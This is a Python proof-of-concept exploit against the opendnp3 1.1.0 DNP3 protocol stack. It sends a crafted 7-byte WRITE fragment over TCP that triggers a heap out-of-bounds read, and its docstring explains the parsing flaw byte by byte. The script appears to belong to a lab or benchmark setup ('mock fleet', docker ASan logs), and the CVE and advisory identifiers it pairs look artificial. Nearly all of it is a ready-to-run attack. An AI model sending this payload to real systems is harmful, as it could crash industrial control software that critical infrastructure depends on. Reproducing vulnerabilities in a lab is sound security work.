#!/usr/bin/env python3
"""
PoC for the opendnp3 1.1.0 APDU range-qualifier object over-read (CWE-125),
tracked in this mock fleet as CVE-2020-28875 (ICSA-13-291-01 "aegis" family).

The fragment is a DNP3 application APDU:
    C0          application control (FIR=1, FIN=1, seq=0)
    02          function code 0x02 = WRITE (has_data = true)
    01 00       object: group 1, variation 0 (placeholder / var-0 object)
    00          qualifier 0x00 = QC_1B_START_STOP (1-byte start/stop range)
    00 00       range start = 0x00, stop = 0x00 (1 object), NO object payload

APDU::ReadObjectHeader validates the placeholder object's data_size as 0, so the
header passes the length guard; GetNumObjects() (Stop-Start+1 = 1) yields one
iterable object whose ObjectReadIterator data pointer is past the fragment.
Reading it over-reads the genuine opendnp3 fragment buffer -> ASan
heap-buffer-overflow.

Usage: poc_cve_2020_28875.py [host] [port]
"""
import socket
import sys

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 20000

frag = bytes([0xC0, 0x02, 0x01, 0x00, 0x00, 0x00, 0x00])

print(f"[*] Connecting to {host}:{port}")
s = socket.create_connection((host, port), timeout=5)
print(f"[*] Sending {len(frag)}-byte DNP3 fragment: {frag.hex()}")
s.sendall(frag)
try:
    s.shutdown(socket.SHUT_WR)
except OSError:
    pass
try:
    data = s.recv(256)
    print(f"[*] Server response: {data!r}")
except OSError as e:
    print(f"[*] Connection closed/reset (expected on crash): {e}")
s.close()
print("[*] Done. Check `docker logs` for the ASan heap-buffer-overflow trace.")
